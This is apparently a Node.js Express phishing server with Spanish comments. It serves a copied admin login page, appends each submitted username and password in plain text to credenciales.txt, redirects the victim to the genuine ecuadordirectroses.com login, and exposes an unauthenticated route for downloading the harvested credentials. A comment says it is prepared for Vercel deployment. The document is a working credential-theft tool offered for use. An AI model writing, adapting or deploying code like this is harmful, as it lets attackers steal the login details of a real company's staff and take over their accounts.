const express = require("express");
const fs = require("fs");
const path = require("path");
const bodyParser = require("body-parser");

const app = express();
const PORT = process.env.PORT || 3000; // Usa el puerto 3000 por defecto

// Middleware para leer formularios
app.use(bodyParser.urlencoded({ extended: true }));

// Servir archivos estáticos (como CSS o imágenes)
app.use(
  "/edradminlogin_files",
  express.static(path.join(__dirname, "edradminlogin_files"))
);

app.get("/auth", (req, res) => {
  const filePath = path.join(__dirname, "edradminlogin.html");
  res.sendFile(filePath);
});

// Ruta para descargar el archivo credenciales.txt
app.get('/descargar', (req, res) => {
  const filePath = path.join(__dirname, 'credenciales.txt');
  res.download(filePath, 'credenciales.txt', (err) => {
    if (err) {
      console.error('Error al descargar el archivo:', err);
      res.status(500).send('Error al descargar el archivo');
    }
  });
});

// Ruta para procesar el formulario
app.post("/login", (req, res) => {
  const { usuario, clave } = req.body;

  // Guardar credenciales en archivo
  const credenciales = `Usuario: ${usuario} | Clave: ${clave}\n`;
  fs.appendFileSync(
    path.join(__dirname, "credenciales.txt"),
    credenciales
  );

  // Redirigir a otra web
  res.redirect("https://www.ecuadordirectroses.com:9000/auth/login");
});

// Iniciar el servidor
app.listen(PORT, () => {
  console.log(`Servidor corriendo en http://localhost:${PORT}`);
});


module.exports = app;
module.exports.handler = serverless(app); // 👈 NECESARIO para que Vercel lo ejecute